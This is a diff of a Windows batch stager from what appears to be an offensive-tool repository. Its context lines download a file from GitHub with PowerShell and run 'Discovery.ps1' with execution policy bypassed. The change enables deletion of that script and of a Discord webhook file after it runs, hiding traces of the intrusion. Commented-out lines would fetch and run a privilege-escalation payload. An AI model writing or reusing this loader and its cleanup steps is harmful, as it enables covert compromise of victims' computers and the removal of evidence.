@@ -20,11 +20,11 @@ powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IContr
 @echo Executing
 powerShell -ExecutionPolicy Bypass -File "Discovery.ps1"
 
-@REM @REM Delete the discovery file
-@REM del "Discovery.ps1"
+@REM Delete the discovery file
+del "Discovery.ps1"
 
-@REM @REM Delete the Discord Webhook file
-@REM del "DiscordWebhookURL.icu"
+@REM Delete the Discord Webhook file
+del "DiscordWebhookURL.icu"
 
 @REM @REM powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/f49099d8d113b227d42a031886fca74aba4cf772/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
 @REM @REM powershell -ExecutionPolicy RemoteSigned -File "PrivilegeEscalation.cmd"
